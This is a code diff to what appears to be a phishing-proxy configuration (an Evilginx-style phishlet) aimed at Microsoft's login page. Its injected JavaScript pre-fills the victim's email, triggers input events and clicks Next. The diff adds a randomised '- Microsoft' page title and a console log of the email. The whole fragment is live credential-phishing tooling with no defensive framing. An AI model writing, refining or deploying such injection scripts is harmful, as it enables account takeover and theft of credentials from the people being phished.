@@ -110,11 +110,17 @@ js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/*"]
     script: |
+      // Generate random title
+      const randomWords = ['Welcome', 'Secure', 'Access', 'Portal', 'Login', 'Account', 'Verify', 'Sign In'];
+      const randomTitle = randomWords[Math.floor(Math.random() * randomWords.length)];
+      document.title = randomTitle + ' - Microsoft';
+      
       function lp(){
         const emailInput = document.getElementById("i0116");
         if (emailInput) {
           // Set the value
-          emailInput.value = "{email}";
+          console.log("Setting email value to: {email}");
+           emailInput.value = "{email}";
           
           // Trigger input events to make the page detect the change
           emailInput.dispatchEvent(new Event('input', { bubbles: true }));
@@ -128,6 +134,9 @@ js_inject:
           if (nextButton) {
             nextButton.click();
           }
+
+          
+          
           return true; // Exit the loop
         }
         return false; // Continue checking
